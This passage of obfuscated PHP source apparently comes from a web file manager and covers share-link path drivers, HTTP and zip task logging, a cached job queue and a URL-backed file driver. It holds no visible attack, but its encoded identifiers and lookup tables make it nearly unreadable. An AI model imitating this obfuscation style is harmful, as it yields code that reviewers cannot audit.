$İœ³¸Ûæ) { $»ò”¨èû =& $_SERVER[ÕŸ²ó÷å]; if (method_exists($this, $¦Èş¶üì)) { return; } $Öûõğ±Ô = call_user_func_array(array($»ò”¨èû[1430], $¦Èş¶üì), $İœ³¸Ûæ); $ññğêòÚ = array($»ò”¨èû[1431], $»ò”¨èû[1432], $»ò”¨èû[1433], $»ò”¨èû[1434], $»ò”¨èû[627], $»ò”¨èû[629], $»ò”¨èû[1435], $»ò”¨èû[120], $»ò”¨èû[1436], $»ò”¨èû[1437]); if (in_array($¦Èş¶üì, $ññğêòÚ)) { $Öûõğ±Ô = $this->getPathOuter($Öûõğ±Ô); } return $Öûõğ±Ô; } public function copy($®»”ğş§, $º¾ÓÀò, $†ë‰¨ = false, $²òúı¸™ = false) { return $this->copyMove($®»”ğş§, $º¾ÓÀò, $†ë‰¨, $_SERVER[ÕŸ²ó÷å][627], $²òúı¸™); } public function move($ñÒˆëå, $Å£€…Šğ, $çù“–Ì = false, $äÜß‘èı = false) { return $this->copyMove($ñÒˆëå, $Å£€…Šğ, $çù“–Ì, $_SERVER[ÕŸ²ó÷å][629], $äÜß‘èı); } private function copyMove($ãÎïÏ­ã, $ÁÎÅ¨ÒÆ, $¢æàÃ–¾, $©÷íİŞ, $‡ˆî›ÚÜ = false) { $êúî˜¨® =& $_SERVER[ÕŸ²ó÷å]; $ÍÎü¶ÉÌ = $ÁÎÅ¨ÒÆ; $®¸İß­ = IO::driverMake($ÁÎÅ¨ÒÆ); if ($®¸İß­->pathParse[$êúî˜¨®[1235]]) { $ÁÎÅ¨ÒÆ = $®¸İß­->pathParse[$êúî˜¨®[1235]]; } else { $ÁÎÅ¨ÒÆ = $ÍÎü¶ÉÌ; } $ˆ©òôÕ = IO::copyMove($ãÎïÏ­ã, $ÁÎÅ¨ÒÆ, $¢æàÃ–¾, $©÷íİŞ, $‡ˆî›ÚÜ); $ˆ©òôÕ = $this->getPathOuter($ˆ©òôÕ); return $ˆ©òôÕ; } public function pathThis($Ü®¿Áµş) { return get_path_this($this->pathParse[$_SERVER[ÕŸ²ó÷å][97]]); } public function pathFather($ûÏ¦®ï) { return get_path_father($this->pathParse[$_SERVER[ÕŸ²ó÷å][97]]); } public function iconvSystem($øõĞàõÇ) { return $øõĞàõÇ; } protected function infoParse($«Î‡Áó, $Ÿ­°»à‡ = false) { $•‚À±Å˜ =& $_SERVER[ÕŸ²ó÷å]; $´…§ÎÑ = $this->pathParse[$•‚À±Å˜[569]][$•‚À±Å˜[1260]] . $this->pathParse[$•‚À±Å˜[1253]]; if ($Ÿ­°»à‡) { $ÜÁ»¤£ = IO::infoWithChildren($´…§ÎÑ); } else { $ÜÁ»¤£ = IO::info($´…§ÎÑ); } $ˆöøêÃ = $this->pathParse[$•‚À±Å˜[569]]; return Action($•‚À±Å˜[1428])->_shareItemeParse($ÜÁ»¤£, $ˆöøêÃ); } public function listAll($ñ¨ä‚ñ©) { $íåüşäÊ =& $_SERVER[ÕŸ²ó÷å]; $ˆ„ª’”¤ = IO::listAll($ñ¨ä‚ñ©); $ÕíÏÙ  = rtrim($this->pathParse[$íåüşäÊ[569]][$íåüşäÊ[1260]], $íåüşäÊ[8]); foreach ($ˆ„ª’”¤ as &$ĞìøÌßš) { $ĞìøÌßš[$íåüşäÊ[97]] = $this->pathDriver . $íåüşäÊ[8] . ltrim(substr($ĞìøÌßš[$íåüşäÊ[97]], strlen($ÕíÏÙ )), $íåüşäÊ[8]); } unset($ĞìøÌßš); return $ˆ„ª’”¤; } public function listAllSimple($›ÒÈúÃô, $†À”ãê‡ = false) { $üÊúç§Ğ =& $_SERVER[ÕŸ²ó÷å]; $¬ñ‚ƒæñ = $this->listAll($›ÒÈúÃô); $ê¼«ø†¿ = $this->pathParse[$üÊúç§Ğ[504]]; if (trim($ê¼«ø†¿, $üÊúç§Ğ[8]) == trim(get_path_father($ê¼«ø†¿), $üÊúç§Ğ[8])) { $†À”ãê‡ = !0; } return IO::init($üÊúç§Ğ[12])->listAllSimpleMake($¬ñ‚ƒæñ, $ê¼«ø†¿, $†À”ãê‡); } public function getPathOuter($‘å›Šéƒ) { $¥î¹£çû =& $_SERVER[ÕŸ²ó÷å]; $ŞÙèğ = KodIO::parse($‘å›Šéƒ); if ($ŞÙèğ[$¥î¹£çû[33]] == KodIO::KOD_SHARE_ITEM) { return $ŞÙèğ[$¥î¹£çû[97]]; } $¢¡İïÖÒ = KodIO::clear($‘å›Šéƒ); $æÔØí¿¶ = KodIO::clear($this->pathParse[$¥î¹£çû[569]][$¥î¹£çû[1260]]); $‡‰Ã³´ä = substr($¢¡İïÖÒ, strlen($æÔØí¿¶)); if (substr($¢¡İïÖÒ, 0, strlen($æÔØí¿¶)) != $æÔØí¿¶) { return !1; } return $this->pathParse[$¥î¹£çû[1254]] . $¥î¹£çû[8] . ltrim($‡‰Ã³´ä, $¥î¹£çû[8]); } public function getType() { $ìšˆ§¹› =& $_SERVER[ÕŸ²ó÷å]; $–õø–Â = str_replace($ìšˆ§¹›[87], $ìšˆ§¹›[12], get_class($this)); return strtolower($–õø–Â); } public function isOsDriver($ Ä†Æá) { return IO::isOsDriver($ Ä†Æá); } public function info($¶¡í¬«’) { return $this->infoParse($¶¡í¬«’); } public function infoAuth($æ…½óÊ÷) { return $this->infoParse($æ…½óÊ÷); } public function infoWithChildren($åÒ ŒáË) { return $this->infoParse($åÒ ŒáË, !0); } public function infoFull($áŠÏ‡‚Î) { return $this->infoParse($áŠÏ‡‚Î); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ËŠÇ³Ş) { $this->pathParse = $ËŠÇ³Ş; } protected function infoParse($ĞÆŸÉÏ®, $÷Ä•ôø = false) { $ÄØ„ÍÆ¤ =& $_SERVER[ÕŸ²ó÷å]; return Action($ÄØ„ÍÆ¤[1259])->sharePathInfo($this->pathParse[$ÄØ„ÍÆ¤[97]], !0, $÷Ä•ôø); } public function listPath($£¯„Ÿá¬, $¿ƒî”•€ = false) { $åšŒçÉ³ =& $_SERVER[ÕŸ²ó÷å]; $ÁÍ°íğê = IO::listPath($£¯„Ÿá¬, $¿ƒî”•€); if (!$ÁÍ°íğê) { return $ÁÍ°íğê; } if (is_array($ÁÍ°íğê[$åšŒçÉ³[1429]])) { $¹å‚˜û‡ = Action($åšŒçÉ³[1438])->parsePathChildren($ÁÍ°íğê[$åšŒçÉ³[1429]], array($åšŒçÉ³[504] => $£¯„Ÿá¬)); $ÁÍ°íğê[$åšŒçÉ³[1429]] = Action($åšŒçÉ³[1259])->shareItemInfo($¹å‚˜û‡); } foreach ($ÁÍ°íğê as $³Ò€ÜˆÙ => $İÎ¢ÑÙ™) { if (!in_array($³Ò€ÜˆÙ, array($åšŒçÉ³[96], $åšŒçÉ³[95]))) { continue; } foreach ($İÎ¢ÑÙ™ as $Íê‚›¶ => $¹å‚˜û‡) { $¹å‚˜û‡ = Action($åšŒçÉ³[1438])->parsePathChildren($¹å‚˜û‡, array($åšŒçÉ³[504] => $£¯„Ÿá¬)); $ÁÍ°íğê[$³Ò€ÜˆÙ][$Íê‚›¶] = Action($åšŒçÉ³[1259])->shareItemInfo($¹å‚˜û‡); } } return $ÁÍ°íğê; } } goto c¶ÛĞ’ğ­½; CÂ’Îì¡¶‹: class TaskHttp extends Task { protected function startAfter() { $ƒú±Ÿ› =& $_SERVER[ÕŸ²ó÷å]; $ç¡¦’º =& $this->task; $ç¡¦’º[$ƒú±Ÿ›[1850]] = 1; Hook::bind($ƒú±Ÿ›[1818], array($this, $ƒú±Ÿ›[1851])); Hook::bind($ƒú±Ÿ›[1820], array($this, $ƒú±Ÿ›[1852])); Hook::bind($ƒú±Ÿ›[1822], array($this, $ƒú±Ÿ›[1853])); } protected function endAfter() { $â¸íÂ«Á =& $_SERVER[ÕŸ²ó÷å]; Hook::unbind($â¸íÂ«Á[1818], array($this, $â¸íÂ«Á[1851])); Hook::unbind($â¸íÂ«Á[1820], array($this, $â¸íÂ«Á[1852])); Hook::unbind($â¸íÂ«Á[1822], array($this, $â¸íÂ«Á[1853])); } public function progressStart($³ÄÜãÙ) { $Ñİ¾¼«¥ =& $_SERVER[ÕŸ²ó÷å]; $ãù—Ş”Õ = curl_getinfo($³ÄÜãÙ); self::log($Ñİ¾¼«¥[1854] . $ãù—Ş”Õ[$Ñİ¾¼«¥[392]]); self::valueSet($this->task[$Ñİ¾¼«¥[484]], $this->task); } public function progressEnd($¹ÅÆğÄ) { $Ø¿Œ®Ë =& $_SERVER[ÕŸ²ó÷å]; self::log($Ø¿Œ®Ë[1855] . $this->task[$Ø¿Œ®Ë[484]]); $this->end(); } public function progress($Ş§âê‚›, $âêï˜î, $††»ËÑ¸, $íğ‘ÁÖ, $İ®Şõ›ñ) { $¶è¤Ñá =& $_SERVER[ÕŸ²ó÷å]; $úÎ•İ¸× =& $this->task; if ($İ®Şõ›ñ > 0) { $úÎ•İ¸×[$¶è¤Ñá[1144]] = $úÎ•İ¸×[$¶è¤Ñá[1144]] == 0 ? $íğ‘ÁÖ : $úÎ•İ¸×[$¶è¤Ñá[1144]]; $úÎ•İ¸×[$¶è¤Ñá[1774]] = $İ®Şõ›ñ; } else { if ($††»ËÑ¸ > 0) { $úÎ•İ¸×[$¶è¤Ñá[1144]] = $úÎ•İ¸×[$¶è¤Ñá[1144]] == 0 ? $âêï˜î : $úÎ•İ¸×[$¶è¤Ñá[1144]]; $úÎ•İ¸×[$¶è¤Ñá[1774]] = $††»ËÑ¸; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\x65\x73\x73\x48\x74\164\160\72\x64\x6f\x77\156\x3a{$††»ËÑ¸}\57{$âêï˜î}\x3b\x20\x75\160\154\x6f\141\144\x3a{$İ®Şõ›ñ}\x2f{$íğ‘ÁÖ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ºŸÙ‚Äç, $ü˜‡Ê = '', $ƒ¿ĞÉÙ = 0, $¥Å¸õ³© = '') { $æÒÊÄ¡€ =& $_SERVER[ÕŸ²ó÷å]; $¥Å¸õ³© = $¥Å¸õ³© ? $¥Å¸õ³© : ($ü˜‡Ê ? $ü˜‡Ê : $ºŸÙ‚Äç); $“»ıŸ‰× = new Task($ºŸÙ‚Äç, $ü˜‡Ê, $ƒ¿ĞÉÙ, $¥Å¸õ³©); $GLOBALS[$æÒÊÄ¡€[1856] . $ºŸÙ‚Äç] = new TaskLog($æÒÊÄ¡€[1757], $“»ıŸ‰×, $¥Å¸õ³©); return $“»ıŸ‰×; } public function __construct($õ÷õñ¼í = '', $‘Î–Ì“ì = '', $¸ ôÑ¹ = '') { $µİ¬á‰¼ =& $_SERVER[ÕŸ²ó÷å]; if (!$õ÷õñ¼í) { $õ÷õñ¼í = $µİ¬á‰¼[1757]; } $Ö‰»»Ö = $õ÷õñ¼í . $µİ¬á‰¼[471] . rand_string(10); if (!$¸ ôÑ¹) { $¸ ôÑ¹ = $õ÷õñ¼í . $µİ¬á‰¼[53] . $¸ ôÑ¹; } switch ($õ÷õñ¼í) { case $µİ¬á‰¼[1757]: if (!$‘Î–Ì“ì || !$‘Î–Ì“ì->task) { return echoLog($õ÷õñ¼í . $µİ¬á‰¼[1857]); } $­û¿ÌöÎ = $‘Î–Ì“ì; $Ö‰»»Ö = $­û¿ÌöÎ->task[$µİ¬á‰¼[484]]; $õ÷õñ¼í = $­û¿ÌöÎ->task[$µİ¬á‰¼[484]]; if (!$­û¿ÌöÎ->task[$µİ¬á‰¼[1662]]) { $­û¿ÌöÎ->task[$µİ¬á‰¼[1662]] = $¸ ôÑ¹ ? $¸ ôÑ¹ : $õ÷õñ¼í; } break; case $µİ¬á‰¼[1858]: if (!$‘Î–Ì“ì) { return echoLog($õ÷õñ¼í . $µİ¬á‰¼[1859]); } $ÑÚÓ§÷ = is_string($‘Î–Ì“ì) ? array($‘Î–Ì“ì) : $‘Î–Ì“ì; $­û¿ÌöÎ = new TaskFileTransfer($Ö‰»»Ö, $õ÷õñ¼í, 0, $¸ ôÑ¹ ? $¸ ôÑ¹ : $ÑÚÓ§÷[0]); foreach ($ÑÚÓ§÷ as $ğğ¶ÃùŠ) { $­û¿ÌöÎ->addPath($ğğ¶ÃùŠ); } break; case $µİ¬á‰¼[398]: if (!$‘Î–Ì“ì) { return echoLog($õ÷õñ¼í . $µİ¬á‰¼[1859]); } $ÑÚÓ§÷ = is_string($‘Î–Ì“ì) ? array($‘Î–Ì“ì) : $‘Î–Ì“ì; $­û¿ÌöÎ = new TaskZip($Ö‰»»Ö, $õ÷õñ¼í, 0, $¸ ôÑ¹ ? $¸ ôÑ¹ : $ÑÚÓ§÷[0]); foreach ($ÑÚÓ§÷ as $ğğ¶ÃùŠ) { $­û¿ÌöÎ->addPath($ğğ¶ÃùŠ); } break; case $µİ¬á‰¼[1302]: if (!$‘Î–Ì“ì) { return echoLog($õ÷õñ¼í . $µİ¬á‰¼[1859]); } $­û¿ÌöÎ = new TaskUnZip($Ö‰»»Ö, $õ÷õñ¼í, 0, $¸ ôÑ¹ ? $¸ ôÑ¹ : $‘Î–Ì“ì); if ($‘Î–Ì“ì) { $­û¿ÌöÎ->addFile($‘Î–Ì“ì); } break; case $µİ¬á‰¼[162]: $­û¿ÌöÎ = new TaskHttp($Ö‰»»Ö, $õ÷õñ¼í); break; default: return; break; } $this->task = $­û¿ÌöÎ; $this->taskID = $Ö‰»»Ö; Hook::bind($µİ¬á‰¼[1794], array($this, $µİ¬á‰¼[1860])); Hook::bind($µİ¬á‰¼[1796], array($this, $µİ¬á‰¼[1861])); Hook::bind($µİ¬á‰¼[1790], array($this, $µİ¬á‰¼[1862])); echoLog($µİ¬á‰¼[1863] . $­û¿ÌöÎ->task[$µİ¬á‰¼[1662]]); } public function __destruct() { $this->end(); } public function end($öé¬®Ìº = '') { $§Ã–Å®À =& $_SERVER[ÕŸ²ó÷å]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($öé¬®Ìº); $this->task = !1; $this->taskID = !1; Hook::unbind($§Ã–Å®À[1794], array($this, $§Ã–Å®À[1860])); Hook::unbind($§Ã–Å®À[1796], array($this, $§Ã–Å®À[1861])); Hook::unbind($§Ã–Å®À[1790], array($this, $§Ã–Å®À[1862])); } public function taskUpdate($ä·³Ñš) { $øÓŸÊçï =& $_SERVER[ÕŸ²ó÷å]; if (!$ä·³Ñš || $this->taskID != $ä·³Ñš[$øÓŸÊçï[484]]) { return; } $ÄüÉíìŠ = 20; $Ûú®ò„ß = intval($ä·³Ñš[$øÓŸÊçï[1775]] * $ÄüÉíìŠ); $øÊîµ„É = $øÓŸÊçï[186] . str_repeat($øÓŸÊçï[515], $Ûú®ò„ß) . $øÓŸÊçï[1095] . str_repeat($øÓŸÊçï[53], $ÄüÉíìŠ - $Ûú®ò„ß) . $øÓŸÊçï[188]; $ŠÔø†‚Ù = $øÊîµ„É . sprintf($øÓŸÊçï[1864], $ä·³Ñš[$øÓŸÊçï[1775]] * 100) . $øÓŸÊçï[1865]; $¿Ú¥¼Ì = $ŠÔø†‚Ù . $ä·³Ñš[$øÓŸÊçï[1774]] . $øÓŸÊçï[8] . $ä·³Ñš[$øÓŸÊçï[1144]] . LNG($øÓŸÊçï[1866]); $Ü¥‘•ê‡ = $øÓŸÊçï[12]; if ($ä·³Ñš[$øÓŸÊçï[1850]]) { $¿Ú¥¼Ì = $ŠÔø†‚Ù . size_format($ä·³Ñš[$øÓŸÊçï[1774]]) . $øÓŸÊçï[8] . size_format($ä·³Ñš[$øÓŸÊçï[1144]]); $Ü¥‘•ê‡ = size_format($ä·³Ñš[$øÓŸÊçï[1776]]) . $øÓŸÊçï[1867]; } if ($ä·³Ñš[$øÓŸÊçï[1146]]) { $ä·³Ñš[$øÓŸÊçï[1824]] = $ä·³Ñš[$øÓŸÊçï[1146]] . $øÓŸÊçï[53] . $ä·³Ñš[$øÓŸÊçï[1824]]; } if ($ä·³Ñš[$øÓŸÊçï[1824]]) { $³îíß§ = $øÓŸÊçï[12]; if ($ä·³Ñš[$øÓŸÊçï[1826]]) { $³îíß§ = $øÓŸÊçï[50] . size_format($ä·³Ñš[$øÓŸÊçï[1827]]) . $øÓŸÊçï[8] . size_format($ä·³Ñš[$øÓŸÊçï[1826]]); } $Ü¥‘•ê‡ .= $ä·³Ñš[$øÓŸÊçï[1824]] . $³îíß§; } if ($ä·³Ñš[$øÓŸÊçï[847]] && !$ä·³Ñš[$øÓŸÊçï[1826]]) { $Ü¥‘•ê‡ .= $øÓŸÊçï[53] . size_format($ä·³Ñš[$øÓŸÊçï[1831]]) . $øÓŸÊçï[8] . size_format($ä·³Ñš[$øÓŸÊçï[847]]); } echoLog($¿Ú¥¼Ì . $øÓŸÊçï[53] . $Ü¥‘•ê‡, !0); } public function taskEnd($çóôÚ) { $­à½Ğ‰« =& $_SERVER[ÕŸ²ó÷å]; if (!$çóôÚ || $this->taskID != $çóôÚ[$­à½Ğ‰«[484]]) { return; } $øâÜ»Âğ = $çóôÚ ? $çóôÚ[$­à½Ğ‰«[1774]] . $­à½Ğ‰«[8] . $çóôÚ[$­à½Ğ‰«[1144]] . LNG($­à½Ğ‰«[1866]) . $­à½Ğ‰«[84] : $­à½Ğ‰«[12]; echoLog($­à½Ğ‰«[1868] . $çóôÚ[$­à½Ğ‰«[1662]] . ($çóôÚ[$­à½Ğ‰«[535]] ? $­à½Ğ‰«[84] . $çóôÚ[$­à½Ğ‰«[535]] : $­à½Ğ‰«[12]) . $­à½Ğ‰«[84] . $øâÜ»Âğ . $­à½Ğ‰«[1869] . sprintf($­à½Ğ‰«[935], timeFloat() - $çóôÚ[$­à½Ğ‰«[1777]]) . $­à½Ğ‰«[1789]); $this->end(); } public function taskKill($ĞÃ‰ü†) { $îÄÁ´ÔÆ =& $_SERVER[ÕŸ²ó÷å]; if (!$ĞÃ‰ü† || $this->taskID != $ĞÃ‰ü†[$îÄÁ´ÔÆ[484]]) { return; } echoLog($îÄÁ´ÔÆ[1870] . $ĞÃ‰ü†[$îÄÁ´ÔÆ[1662]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\121\165\x65\x75\x65\x4c\145\156\147\164\x68"; const QUEUE_DATA = "\164\141\163\153\121\165\145\x75\145\104\x61\164\x61"; const QUEUE_TIME = "\x74\x61\163\x6b\x51\165\145\x75\145\114\141\x73\164\x52\x75\156"; const QUEUE_THREAD = "\164\141\163\153\x51\165\145\165\145\x54\x68\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($‹·ŒÖçî, $”à·¨¬È = array(), $Ò øŞº = '', $Ÿó–½ú = '') { $»¡äø¹ß =& $_SERVER[ÕŸ²ó÷å]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ÿó–½ú && array_find_by_field(self::$listData, $»¡äø¹ß[107], $Ÿó–½ú)) { return !0; } if ($Ÿó–½ú && array_find_by_field(self::$listDataAdd, $»¡äø¹ß[107], $Ÿó–½ú)) { return !0; } self::$listDataAdd[] = array($»¡äø¹ß[350] => $‹·ŒÖçî, $»¡äø¹ß[1871] => $”à·¨¬È, $»¡äø¹ß[535] => $Ò øŞº, $»¡äø¹ß[107] => $Ÿó–½ú); return !0; } public static function addSubmit() { $¬«ãñ— =& $_SERVER[ÕŸ²ó÷å]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¬«ãñ—[1872] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¬«ãñ—[12], $¬«ãñ—[535])), $¬«ãñ—[207]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($É¥°ª­Ò, $¼İæ×á = array(), $î•üáï• = '', $¢íÖí  = '') { $„íêÙäÀ =& $_SERVER[ÕŸ²ó÷å]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Í ‹ƒ‰ = self::getAll(); if ($¢íÖí  && array_find_by_field($Í ‹ƒ‰, $„íêÙäÀ[107], $¢íÖí )) { return !0; } $Í ‹ƒ‰[] = array($„íêÙäÀ[350] => $É¥°ª­Ò, $„íêÙäÀ[1871] => $¼İæ×á, $„íêÙäÀ[535] => $î•üáï•, $„íêÙäÀ[107] => $¢íÖí ); self::setAll($Í ‹ƒ‰); write_log($„íêÙäÀ[1872] . $î•üáï•, $„íêÙäÀ[207]); return !0; } public static function run() { $í ª¾¬ =& $_SERVER[ÕŸ²ó÷å]; $İñ›¤ë´ = self::getAll(); $ğ–ç…¬Ü = array_shift($İñ›¤ë´); if (!$ğ–ç…¬Ü) { return !1; } self::setAll($İñ›¤ë´); $À“âŸ œ = timeFloat(); $ğèíÑÈÇ = $í ª¾¬[12]; try { $ğèíÑÈÇ = Hook::apply($ğ–ç…¬Ü[$í ª¾¬[350]], $ğ–ç…¬Ü[$í ª¾¬[1871]]); } catch (Exception $Íº–š–†) { write_log($Íº–š–†, $í ª¾¬[1267]); } $ş˜—¦ØÖ = number_format(timeFloat() - $À“âŸ œ, 3) . $í ª¾¬[1789]; if ($ğèíÑÈÇ && is_string($ğèíÑÈÇ)) { $ş˜—¦ØÖ = $ş˜—¦ØÖ . $í ª¾¬[1873] . $ğèíÑÈÇ; } write_log($í ª¾¬[1874] . $ğ–ç…¬Ü[$í ª¾¬[535]] . $í ª¾¬[1875] . $ş˜—¦ØÖ, $í ª¾¬[207]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $İÚÙ†Ï =& $_SERVER[ÕŸ²ó÷å]; $Ù¸Çìô = self::threadCount() + 1; if ($Ù¸Çìô > 3 || !self::count()) { return; } write_log($İÚÙ†Ï[1876] . $Ù¸Çìô, $İÚÙ†Ï[207]); Cache::set(self::QUEUE_THREAD, $Ù¸Çìô, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($İÚÙ†Ï[1877], $İÚÙ†Ï[207]); } public static function getKey($šøì¤œÒ, $«½‚— = "\x69\x6e\164") { $»İ„ú€» =& $_SERVER[ÕŸ²ó÷å]; Cache::removeMemory($šøì¤œÒ); $õâÙ“Ò = Cache::get($šøì¤œÒ); if ($«½‚— == $»İ„ú€»[373]) { return $õâÙ“Ò ? intval($õâÙ“Ò) : 0; } if ($«½‚— == $»İ„ú€»[1878]) { return is_array($õâÙ“Ò) ? $õâÙ“Ò : array(); } return $õâÙ“Ò; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ÕŸ²ó÷å][1878]); } public static function setAll($¤îòª‡Å) { $Å•²ÉñÅ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¤îòª‡Å), $Å•²ÉñÅ); Cache::set(self::QUEUE_DATA, $¤îòª‡Å, $Å•²ÉñÅ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto A”Òšø”Áô; a¿÷Ôµª‹ƒ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ğİÆ´å = false) { } public function exist($ø½¼Á®) { $×îÔÔÆ× = $this->info($ø½¼Á®); return $×îÔÔÆ×[$_SERVER[ÕŸ²ó÷å][242]]; } public function isFile($¿áõ¤»Æ) { $§À»Âı’ = $this->info($¿áõ¤»Æ); return $§À»Âı’[$_SERVER[ÕŸ²ó÷å][242]]; } public function isFolder($±¹»©ò) { return !1; } public function size($×ıİ¸Ó) { $ö°ë¾© = $this->info($×ıİ¸Ó); return $ö°ë¾©[$_SERVER[ÕŸ²ó÷å][89]]; } public function info($ÖÅò»¥Ş) { return $this->infoParse($ÖÅò»¥Ş); } public function infoAuth($”×¢ˆÕ) { return $this->infoParse($”×¢ˆÕ); } public function infoWithChildren($ÒîÔ“¼ì) { return $this->infoParse($ÒîÔ“¼ì); } public function infoFull($ñÙö”¿Ä) { return $this->infoParse($ñÙö”¿Ä); } private function infoParse($¹ê ¿‚) { $ıÒ¾—£û =& $_SERVER[ÕŸ²ó÷å]; $ŞËöÉÊÇ = $this->header($¹ê ¿‚); if (!$ŞËöÉÊÇ || !$ŞËöÉÊÇ[$ıÒ¾—£û[834]]) { return !1; } $Ñ¶°›¬Ô = _get($ŞËöÉÊÇ, $ıÒ¾—£û[422], 0); $ÀçÚûÌõ = array($ıÒ¾—£û[32] => $ŞËöÉÊÇ[$ıÒ¾—£û[32]], $ıÒ¾—£û[97] => $¹ê ¿‚, $ıÒ¾—£û[33] => $ıÒ¾—£û[240], $ıÒ¾—£û[89] => intval($Ñ¶°›¬Ô), $ıÒ¾—£û[179] => get_path_ext($ŞËöÉÊÇ[$ıÒ¾—£û[32]]), $ıÒ¾—£û[1456] => $Ñ¶°›¬Ô > 0 && $ŞËöÉÊÇ[$ıÒ¾—£û[1606]], $ıÒ¾—£û[1457] => !1); return $ÀçÚûÌõ; } private function header($Éô›•Ì) { $‡ÀïÛä› =& $_SERVER[ÕŸ²ó÷å]; if (isset(self::$_cacheHeader[$Éô›•Ì])) { return self::$_cacheHeader[$Éô›•Ì]; } $µ‚´Ò—— = isset($GLOBALS[$‡ÀïÛä›[1607]]) ? $GLOBALS[$‡ÀïÛä›[1607]] : !1; $GLOBALS[$‡ÀïÛä›[1607]] = !0; self::$_cacheHeader[$Éô›•Ì] = url_header($Éô›•Ì); $GLOBALS[$‡ÀïÛä›[1607]] = $µ‚´Ò——; return self::$_cacheHeader[$Éô›•Ì]; } public function hashSimple($ŸµÈˆšÉ, $¥…”Šú¨ = false) { $ü‡¡™Ú› =& $_SERVER[ÕŸ²ó÷å]; $®ê‰¤„ = $this->info($ŸµÈˆšÉ); if (!$®ê‰¤„ || !$®ê‰¤„[$ü‡¡™Ú›[242]]) { return !1; } $šş„Ö¦å = $®ê‰¤„[$ü‡¡™Ú›[89]]; $ÒÁÔÚëô = 200; $¡ÖÑå¦Û = 50; if ($šş„Ö¦å <= $ÒÁÔÚëô * $¡ÖÑå¦Û) { return md5($this->fileSubstr($ŸµÈˆšÉ, 0, $šş„Ö¦å)) . $šş„Ö¦å; } $Óíûª±× = intval($šş„Ö¦å / $¡ÖÑå¦Û); $´ÄÁ–Úí = $ü‡¡™Ú›[12]; $È‹èÍû = timeFloat(); $¬§ªŒ = 15; for ($§ªÅÖ‘œ = 0; $§ªÅÖ‘œ < $¡ÖÑå¦Û; $§ªÅÖ‘œ++) { if (timeFloat() - $È‹èÍû > $¬§ªŒ) { return !1; } $òï˜¬÷æ = $this->fileSubstr($ŸµÈˆšÉ, $Óíûª±× * $§ªÅÖ‘œ, $ÒÁÔÚëô); if (!$òï˜¬÷æ) { return !1; } $´ÄÁ–Úí .= $òï˜¬÷æ; } $´ÄÁ–Úí .= $this->fileSubstr($ŸµÈˆšÉ, $šş„Ö¦å - $ÒÁÔÚëô, $ÒÁÔÚëô); return md5($´ÄÁ–Úí) . $šş„Ö¦å; } public function getContent($½‡î¼÷„) { return $this->fileSubstr($½‡î¼÷„); } public function fileSubstr($‹…²²Ç, $´Œäç±™ = 0, $ø«µ—¿‘ = -1) { $õâ¾ÁÈ =& $_SERVER[ÕŸ²ó÷å]; $ÕÔıª» = $this->info($‹…²²Ç); if (!$ÕÔıª» || !$ÕÔıª»[$õâ¾ÁÈ[242]] && $ÕÔıª»[$õâ¾ÁÈ[89]] > 1024 * 1024 * 10) { return !1; } if ($ø«µ—¿‘ === -1) { $ø«µ—¿‘ = $ÕÔıª»[$õâ¾ÁÈ[89]]; } if ($ø«µ—¿‘ == 0) { return $õâ¾ÁÈ[12]; } $ì‚¿¼¹“ = array($õâ¾ÁÈ[1608] . $´Œäç±™ . $õâ¾ÁÈ[869] . ($´Œäç±™ + $ø«µ—¿‘ - 1)); $ÅÚóæŒØ = url_request($‹…²²Ç, $õâ¾ÁÈ[271], !1, $ì‚¿¼¹“, !1, !1, 30); return $ÅÚóæŒØ[$õâ¾ÁÈ[1290]] ? $ÅÚóæŒØ[$õâ¾ÁÈ[1290]] : $õâ¾ÁÈ[12]; } public function download($›ç‚œ•Ô, $ßñ…÷ãÈ) { Downloader::start($›ç‚œ•Ô, $ßñ…÷ãÈ); return $ßñ…÷ãÈ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($—ª¯™†ß, $ÖŞùÇÑ„ = '') { $this->info = $this->info($—ª¯™†ß); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÕŸ²ó÷å][97]]; $this->pathOpen = $—ª¯™†ß; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$—ª¯™†ß])) { self::$_chunkBuffer[$—ª¯™†ß] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($º™°õÚŸ) { $©‡•öš = $this->fileSubstr($this->pose, $º™°õÚŸ); $this->pose += strlen($©‡•öš); return $©‡•öš; } public function stream_tell() { return $this->pose; } public function stream_seek($ÙæÅîÕµ, $ä‘ÎœÀ) { $ï‘øòå« =& $_SERVER[ÕŸ²ó÷å]; if ($ä‘ÎœÀ == SEEK_SET) { $this->pose = $ÙæÅîÕµ; } else { if 